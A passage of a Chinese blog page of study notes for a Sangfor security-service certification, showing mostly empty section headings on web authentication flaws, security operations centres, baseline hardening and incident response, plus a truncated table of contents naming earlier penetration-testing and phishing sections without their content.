<h5 id="验证机制执行缺陷"><a href="#验证机制执行缺陷" class="headerlink" title="验证机制执行缺陷"></a>验证机制执行缺陷</h5><h4 id="4-8-3-会话管理问题"><a href="#4-8-3-会话管理问题" class="headerlink" title="4.8.3 会话管理问题"></a>4.8.3 会话管理问题</h4><h4 id="4-8-4-权限控制问题"><a href="#4-8-4-权限控制问题" class="headerlink" title="4.8.4 权限控制问题"></a>4.8.4 权限控制问题</h4><h4 id="4-8-5-业务逻辑问题"><a href="#4-8-5-业务逻辑问题" class="headerlink" title="4.8.5 业务逻辑问题"></a>4.8.5 业务逻辑问题</h4><h2 id="第五章-网络安全运营"><a href="#第五章-网络安全运营" class="headerlink" title="第五章 网络安全运营"></a>第五章 网络安全运营</h2><h3 id="第一部分-网络安全运营概述"><a href="#第一部分-网络安全运营概述" class="headerlink" title="第一部分 网络安全运营概述"></a>第一部分 网络安全运营概述</h3><h4 id="5-1-1-什么是安全运营"><a href="#5-1-1-什么是安全运营" class="headerlink" title="5.1.1 什么是安全运营"></a>5.1.1 什么是安全运营</h4><h5 id="安全运营背景"><a href="#安全运营背景" class="headerlink" title="安全运营背景"></a>安全运营背景</h5><p><img src="https://www.helloimg.com/i/2024/12/15/675ef2f05456f.png"></p>
<p><img src="https://www.helloimg.com/i/2024/12/15/675ef313acc34.png"></p>
<p>什么是安全运营？</p>
<p><img src="https://www.helloimg.com/i/2024/12/15/675ef3a5eecf2.png"></p>
<p>从安全运维到安全运营</p>
<p><img src="https://www.helloimg.com/i/2024/12/15/675ef3e0139e9.png"></p>
<p>安全运营工程师做什么？</p>
<p><img src="https://www.helloimg.com/i/2024/12/15/675ef431f21fd.png"></p>
<p><img src="https://www.helloimg.com/i/2024/12/15/675ef468510b9.png"></p>
<h5 id="安全运营和安全运营中心概念"><a href="#安全运营和安全运营中心概念" class="headerlink" title="安全运营和安全运营中心概念"></a>安全运营和安全运营中心概念</h5><p>安全运营中心：</p>
<p>​		安全运营中心(SOC)是指以信息资产为核心，通过针对网络、系统、应用、安全设备的日志和报警事件进行监控和分析，建立一套实时的资产风险模型，以安全事件管理为核心流程，协助安全管理员进行事件分析、风险分析、预警和应急响应处理的集中安全管理系统。</p>
<p>从名称来看：</p>
<ul>
<li>S-&gt;Security(安全)，即SOC处理的事件或流程应该是与企业网络安全相关的，</li>
<li>O-&gt;Operations(运营)，代表着一种动态的动作，包括但不限于实时的检测和响应</li>
<li>C-&gt;Center(中心)，体系化的建设，多领域安全产品、服务“叠加”而成的综合防线</li>
</ul>
<h5 id="安全运营目标"><a href="#安全运营目标" class="headerlink" title="安全运营目标"></a>安全运营目标</h5><p><img src="https://www.helloimg.com/i/2024/12/15/675ef5707709a.png"></p>
<p><img src="https://www.helloimg.com/i/2024/12/15/675ef588b4318.png"></p>
<h5 id="如何实现安全运营"><a href="#如何实现安全运营" class="headerlink" title="如何实现安全运营"></a>如何实现安全运营</h5><p><img src="https://www.helloimg.com/i/2024/12/15/675ef5af209fe.png"></p>
<p><img src="https://www.helloimg.com/i/2024/12/15/675ef6087272f.png"></p>
<p><img src="https://www.helloimg.com/i/2024/12/15/675ef62e7a66a.png"></p>
<p><img src="https://www.helloimg.com/i/2024/12/15/675ef692872a2.png"></p>
<p>成熟的安全运营中心</p>
<p><img src="https://www.helloimg.com/i/2024/12/15/675ef6d162a1c.png"></p>
<p><img src="https://www.helloimg.com/i/2024/12/15/675ef765b2478.png"></p>
<h4 id="5-1-2-安全运营产品与模式"><a href="#5-1-2-安全运营产品与模式" class="headerlink" title="5.1.2 安全运营产品与模式"></a>5.1.2 安全运营产品与模式</h4><h4 id="5-1-3-安全运营技术架构"><a href="#5-1-3-安全运营技术架构" class="headerlink" title="5.1.3 安全运营技术架构"></a>5.1.3 安全运营技术架构</h4><h4 id="5-1-4-安全运营流程"><a href="#5-1-4-安全运营流程" class="headerlink" title="5.1.4 安全运营流程"></a>5.1.4 安全运营流程</h4><h3 id="第二部分-网络安全运营服务"><a href="#第二部分-网络安全运营服务" class="headerlink" title="第二部分 网络安全运营服务"></a>第二部分 网络安全运营服务</h3><h4 id="5-2-1-安全运营服务基础"><a href="#5-2-1-安全运营服务基础" class="headerlink" title="5.2.1 安全运营服务基础"></a>5.2.1 安全运营服务基础</h4><h4 id="5-2-2-安全运营服务技术"><a href="#5-2-2-安全运营服务技术" class="headerlink" title="5.2.2 安全运营服务技术"></a>5.2.2 安全运营服务技术</h4><h3 id="第三部分-网络安全运营流程建设"><a href="#第三部分-网络安全运营流程建设" class="headerlink" title="第三部分 网络安全运营流程建设"></a>第三部分 网络安全运营流程建设</h3><h4 id="5-3-1-安全运营中心的准备和规划"><a href="#5-3-1-安全运营中心的准备和规划" class="headerlink" title="5.3.1 安全运营中心的准备和规划"></a>5.3.1 安全运营中心的准备和规划</h4><h4 id="5-3-2-安全运营中心的实施"><a href="#5-3-2-安全运营中心的实施" class="headerlink" title="5.3.2 安全运营中心的实施"></a>5.3.2 安全运营中心的实施</h4><h4 id="5-3-3-安全运营中心的运营和改进"><a href="#5-3-3-安全运营中心的运营和改进" class="headerlink" title="5.3.3 安全运营中心的运营和改进"></a>5.3.3 安全运营中心的运营和改进</h4><h2 id="第六章-企业安全"><a href="#第六章-企业安全" class="headerlink" title="第六章 企业安全"></a>第六章 企业安全</h2><h3 id="第一部分-基线管理与安全配置提升"><a href="#第一部分-基线管理与安全配置提升" class="headerlink" title="第一部分 基线管理与安全配置提升"></a>第一部分 基线管理与安全配置提升</h3><h4 id="6-1-1-基线管理概述"><a href="#6-1-1-基线管理概述" class="headerlink" title="6.1.1 基线管理概述"></a>6.1.1 基线管理概述</h4><h4 id="6-1-2-windows安全配置"><a href="#6-1-2-windows安全配置" class="headerlink" title="6.1.2 windows安全配置"></a>6.1.2 windows安全配置</h4><h4 id="6-1-3-linux安全配置"><a href="#6-1-3-linux安全配置" class="headerlink" title="6.1.3 linux安全配置"></a>6.1.3 linux安全配置</h4><h4 id="6-1-4-apache安全配置"><a href="#6-1-4-apache安全配置" class="headerlink" title="6.1.4 apache安全配置"></a>6.1.4 apache安全配置</h4><h4 id="6-1-5-mariadb安全配置"><a href="#6-1-5-mariadb安全配置" class="headerlink" title="6.1.5 mariadb安全配置"></a>6.1.5 mariadb安全配置</h4><h4 id="6-1-6-mongodb安全配置"><a href="#6-1-6-mongodb安全配置" class="headerlink" title="6.1.6 mongodb安全配置"></a>6.1.6 mongodb安全配置</h4><h3 id="第二部分-安全事件管理处置"><a href="#第二部分-安全事件管理处置" class="headerlink" title="第二部分 安全事件管理处置"></a>第二部分 安全事件管理处置</h3><h4 id="6-2-1-应急响应简介"><a href="#6-2-1-应急响应简介" class="headerlink" title="6.2.1 应急响应简介"></a>6.2.1 应急响应简介</h4><h4 id="6-2-2事件分级分类"><a href="#6-2-2事件分级分类" class="headerlink" title="6.2.2事件分级分类"></a>6.2.2事件分级分类</h4><h4 id="6-2-3-安全事件处置思路指导"><a href="#6-2-3-安全事件处置思路指导" class="headerlink" title="6.2.3 安全事件处置思路指导"></a>6.2.3 安全事件处置思路指导</h4><h4 id="6-2-4-安全事件处置案例分析"><a href="#6-2-4-安全事件处置案例分析" class="headerlink" title="6.2.4 安全事件处置案例分析"></a>6.2.4 安全事件处置案例分析</h4><h4 id="6-2-5-windows应急响应"><a href="#6-2-5-windows应急响应" class="headerlink" title="6.2.5 windows应急响应"></a>6.2.5 windows应急响应</h4><h4 id="6-2-6-windows应急响应工具与日志"><a href="#6-2-6-windows应急响应工具与日志" class="headerlink" title="6.2.6 windows应急响应工具与日志"></a>6.2.6 windows应急响应工具与日志</h4><h4 id="6-2-7-linux应急响应"><a href="#6-2-7-linux应急响应" class="headerlink" title="6.2.7 linux应急响应"></a>6.2.7 linux应急响应</h4></iframe>
      
    </div>
    <footer class="article-footer">
      
      
      
      
      
      
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1%E8%AE%A4%E8%AF%81/" rel="tag">安全服务认证</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%B7%B1%E4%BF%A1%E6%9C%8D/" rel="tag">深信服</a></li></ul>


    </footer>
  </div>
  
  <nav id="article-nav" data-aos="fade-up">
    
      
      <div class="article-nav-link-wrap article-nav-link-left">
        
          
          
            <img data-src="/covers/5.jpg" data-sizes="auto" alt="WEB源码泄露漏洞" class="lazyload">
          
        
        <a href="/2024/10/14/web-yuan-ma-xie-lu-lou-dong/"></a>
        <div class="article-nav-caption">Prev</div>
        <h3 class="article-nav-title">
          
            WEB源码泄露漏洞
          
        </h3>
      </div>
    
    
    
    <div class="article-nav-link-wrap article-nav-link-right">
      
        
        
          <img data-src="/covers/16.jpg" data-sizes="auto" alt="内网渗透" class="lazyload">
        
      
      <a href="/2024/09/23/nei-wang-shen-tou/"></a>
      <div class="article-nav-caption">Next</div>
      <h3 class="article-nav-title">
        
          内网渗透
        
      </h3>
    </div>
    
  </nav>


</article>










</section>
        </div>
        <footer id="footer">
  <div style="width: 100%; overflow: hidden">
    <div class="footer-line"></div>
  </div>
  <div id="footer-info">
    
    <div>
      <span class="icon-copyright"></span>
      
      
      
        2024-2025
      
      <span class="footer-info-sep "></span>
      mX1@0
    </div>
    
      <div>
        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
      </div>
    
    
      <div>
        <span class="icon-brush"></span>
        302.2k
        &nbsp;|&nbsp;
        <span class="icon-coffee"></span>
        18:50
      </div>
    
    
    
    
    
      <div>
        <span class="icon-eye"></span>
        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
        &nbsp;|&nbsp;
        <span class="icon-user"></span>
        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
      </div>
    
  </div>
</footer>

        
          <div class="sidebar-top">
            <div class="sidebar-top-taichi rotate"></div>
            <div class="arrow-up"></div>
          </div>
        
        <div id="mask" class="hide"></div>
      </div>
      <nav id="mobile-nav">
  <div class="sidebar-wrap">
    
      
        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
  <h3 class="toc-title">Contents</h3>
  <div class="sidebar-toc-wrapper toc-div-class" >
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B7%B1%E4%BF%A1%E6%9C%8D%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1%E8%AE%A4%E8%AF%81%E5%B7%A5%E7%A8%8B%E5%B8%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0"><span class="toc-text">深信服安全服务认证工程师学习笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80"><span class="toc-text">第一章 网络安全基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80"><span class="toc-text">第一部分 网络安全基础</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E4%B8%8E%E5%BA%94%E7%94%A8"><span class="toc-text">第二部分 操作系统配置与应用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8"><span class="toc-text">第三部分 计算机网络原理与应用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80"><span class="toc-text">第二章 网络渗透测试基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A6%82%E8%BF%B0"><span class="toc-text">第一部分 渗透测试概述</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-1-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A0%87%E5%87%86%E4%B8%8E%E6%B5%81%E7%A8%8B"><span class="toc-text">2.1.1 渗透测试标准与流程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A6%82%E8%BF%B0"><span class="toc-text">渗透测试概述</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%88%86%E7%B1%BB"><span class="toc-text">渗透测试分类</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A0%87%E5%87%86%E4%B8%8E%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="toc-text">渗透测试标准与执行流程</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-2-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A"><span class="toc-text">2.1.2 渗透测试报告</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A%E7%9A%84%E9%87%8D%E8%A6%81%E6%80%A7"><span class="toc-text">渗透测试报告的重要性</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A3%E7%A1%AE%E7%BC%96%E5%86%99%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A"><span class="toc-text">正确编写渗透测试报告</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-text">第二部分 渗透测试环境搭建与工具使用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%AB%A0-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">第三章 信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%BB%E8%A7%88"><span class="toc-text">3.1 信息收集总览</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%9A%84%E7%A7%8D%E7%B1%BB"><span class="toc-text">信息收集的种类</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#DNS"><span class="toc-text">DNS</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D"><span class="toc-text">子域名</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#C%E6%AE%B5"><span class="toc-text">C段</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%82%AE%E7%AE%B1"><span class="toc-text">邮箱</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%8C%87%E7%BA%B9"><span class="toc-text">指纹</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%A4%BE%E5%B7%A5%E5%BA%93"><span class="toc-text">社工库</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB"><span class="toc-text">钓鱼攻击</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-DNS%E4%BB%8B%E7%BB%8D"><span class="toc-text">3.2 DNS介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#DNS%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="toc-text">DNS基本原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DNS%E8%AE%B0%E5%BD%95%E6%9F%A5%E8%AF%A2%E6%96%B9%E6%B3%95"><span class="toc-text">DNS记录查询方法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%9F%A5%E8%AF%A2%E6%96%B9%E6%B3%95"><span class="toc-text">域名信息查询方法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CDN"><span class="toc-text">CDN</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86"><span class="toc-text">3.3 子域名收集</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86%E5%8E%9F%E5%9B%A0"><span class="toc-text">子域名收集原因</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86%E6%96%B9%E6%B3%95"><span class="toc-text">子域名收集方法</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-4-C%E6%AE%B5%E6%89%AB%E6%8F%8F"><span class="toc-text">3.4 C段扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#C%E6%AE%B5%E6%89%AB%E6%8F%8F%E5%8E%9F%E5%9B%A0"><span class="toc-text">C段扫描原因</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#C%E6%AE%B5%E6%89%AB%E6%8F%8F%E6%96%B9%E6%B3%95"><span class="toc-text">C段扫描方法</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Nmap"><span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Masscan"><span class="toc-text">Masscan</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-5-Web%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-text">3.5 Web目录扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-text">目录扫描的原因</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-text">目录扫描的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#robots-txt"><span class="toc-text">robots.txt</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E"><span class="toc-text">搜索引擎</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%88%86%E7%A0%B4-%E5%8F%8A%E5%B7%A5%E5%85%B7"><span class="toc-text">爆破 及工具</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-6-%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-text">3.6 指纹识别</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-text">系统指纹识别</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-text">中间件指纹识别</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Web%E7%A8%8B%E5%BA%8F%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-text">Web程序指纹识别</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%98%B2%E7%81%AB%E5%A2%99%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-text">防火墙指纹识别</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-7-GoogleHacking"><span class="toc-text">3.7 GoogleHacking</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-text">逻辑运算符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-text">基本语法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%AB%98%E7%BA%A7%E6%A1%88%E4%BE%8B"><span class="toc-text">高级案例</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-8-%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E"><span class="toc-text">3.8 网络空间搜索引擎</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E4%BB%8B%E7%BB%8D"><span class="toc-text">网络空间搜索引擎介绍</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E"><span class="toc-text">常见搜索引擎</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#shodan"><span class="toc-text">shodan</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95-1"><span class="toc-text">基本语法</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-text">基本使用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-9-%E6%83%85%E6%8A%A5%E5%88%86%E6%9E%90"><span class="toc-text">3.9 情报分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%83%85%E6%8A%A5%E5%88%86%E6%9E%90%E6%A6%82%E5%BF%B5"><span class="toc-text">情报分析概念</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Maltego"><span class="toc-text">Maltego</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-10-%E7%A4%BE%E5%B7%A5%E5%BA%93%E5%92%8C%E5%A4%9A%E7%BB%B4%E5%BA%A6%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">3.10 社工库和多维度信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A4%BE%E5%B7%A5%E5%BA%93-1"><span class="toc-text">社工库</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A4%9A%E7%BB%B4%E5%BA%A6%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">多维度信息收集</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-11-CobaltStrike%E9%85%8D%E7%BD%AE"><span class="toc-text">3.11 CobaltStrike配置</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Cobalt-Strike%E4%BB%8B%E7%BB%8D"><span class="toc-text">Cobalt Strike介绍</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Cobalt-Strike%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE"><span class="toc-text">Cobalt Strike安装配置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Cobalt-Strike%E4%BD%BF%E7%94%A8"><span class="toc-text">Cobalt Strike使用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-12-office%E9%92%93%E9%B1%BC"><span class="toc-text">3.12 office钓鱼</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#office%E9%92%93%E9%B1%BC%E4%BB%8B%E7%BB%8D"><span class="toc-text">office钓鱼介绍</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CobaltStrike%E9%92%93%E9%B1%BC"><span class="toc-text">CobaltStrike钓鱼</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2017-11882"><span class="toc-text">CVE-2017-11882</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-13-%E9%92%93%E9%B1%BC"><span class="toc-text">3.13 钓鱼</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#CHM%E9%92%93%E9%B1%BC"><span class="toc-text">CHM钓鱼</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#LNK%E9%92%93%E9%B1%BC"><span class="toc-text">LNK钓鱼</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#HTA%E9%92%93%E9%B1%BC"><span class="toc-text">HTA钓鱼</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-14-%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E5%92%8C%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6"><span class="toc-text">3.14 网站克隆和钓鱼邮件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86"><span class="toc-text">网站克隆</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6"><span class="toc-text">钓鱼邮件</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E7%AB%A0-Web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E9%AA%8C%E8%AF%81"><span class="toc-text">第四章 Web安全漏洞原理与验证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86-Web%E5%AE%89%E5%85%A8%E7%BB%BC%E8%BF%B0"><span class="toc-text">第一部分 Web安全综述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86-HTTP%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80"><span class="toc-text">第二部分 HTTP协议基础</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E9%AA%8C%E8%AF%81"><span class="toc-text">第三部分 SQL注入漏洞原理与验证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-1-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80"><span class="toc-text">4.3.1 数据库基础</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A6%82%E8%BF%B0"><span class="toc-text">数据库概述</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%BB%E6%B5%81%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F"><span class="toc-text">主流数据库管理系统</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9B%BD%E5%86%85%E8%87%AA%E4%B8%BB%E7%A0%94%E5%8F%91%E7%9A%84%E5%85%B3%E7%B3%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">国内自主研发的关系型数据库</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#MYSQL%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5%E6%96%B9%E5%BC%8F"><span class="toc-text">MYSQL数据库连接方式</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%86%E5%88%AB%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">识别数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" 